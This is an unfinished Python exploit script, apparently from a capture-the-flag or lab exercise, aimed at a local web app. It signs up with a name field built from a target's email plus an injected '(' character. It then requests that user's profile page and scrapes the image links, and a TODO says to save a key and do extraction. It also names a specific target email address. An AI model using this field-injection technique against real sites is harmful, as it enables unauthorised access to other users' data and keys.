import requests
import random
import string
from bs4 import BeautifulSoup
import os

os.makedirs('images', exist_ok=True)

ip = "http://127.0.0.1:5000/"
target_email = "2nov.petro@gmail.com"


def generate_random_string(length):
    return ''.join(
        random.choices(
            string.ascii_lowercase +
            string.digits,
            k=length))


s = requests.Session()

data = {'email': generate_random_string(
    10) + "@google.com", 'name': target_email + "("}


res = s.post(ip + 'sign-up', data=data)
res = s.get(ip + 'profile_' + target_email)
soup = BeautifulSoup(res.text, 'html.parser')
imgs = soup.find_all('img')
imgs = [img['src'] for img in imgs]

# TODO
# save key, do extraction
